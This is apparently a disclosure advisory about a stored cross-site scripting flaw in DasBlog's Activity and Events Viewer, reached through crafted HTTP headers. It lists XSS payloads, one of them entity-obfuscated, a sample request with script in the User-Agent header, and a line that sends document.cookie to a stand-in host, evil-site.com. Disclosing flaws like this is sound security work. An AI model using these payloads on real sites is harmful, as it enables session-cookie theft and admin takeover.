Cross-Site Scripting Vulnerability in Newtelligence DasBlog 

Author:
Dominick Baier <dbaier@...w.de>

1. Summary:
A XSS (Cross-Site-Scripting) Vulnerability in DasBlog's Event and Activity
Viewer allows to inject and execute code on the client's machine. This
allows an attacker to transfer the ASP.NET authentication cookie to a server
of his choice. The attacker can use this cookie to log on to DasBlog and
modify blog entries and configuration settings.

2. Severity : Critical

5. Details

The Activity and Events Viewer show details about requests that were made to
the blog site. As extra information they show the Referrers, Query Strings
and User Agents of these requests. It is possible to specially malform those
HTTP Headers to inject scripting code. This code gets embedded in the HTML
pages and executed on the client. With specially crafted JavaScript code a
attacker can transfer the ASP.NET Forms Authentication Cookie to a server of
the his choice. While injecting this cookie in a HTTP request to DasBlog he
can authenticate without having to know the username or the password and
enter the administrative area.

Examples of script injections

<script>alert('XSS')</script>
<img%20src="javascript:alert('XSS')">
<img%20src=&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a
;alert(&quot;XSS&quot;)>

Leading e.g. to the following HTTP request

GET / HTTP/1.1
User-Agent: <script>alert('xss')</script>
Host: www.victim.com\r\n
Accept: */*


Example of transferring a cookie using JavaScript

<script>document.location='http://www.evil-site.com/cookieEater.aspx?cookie=
'+document.cookie</script>
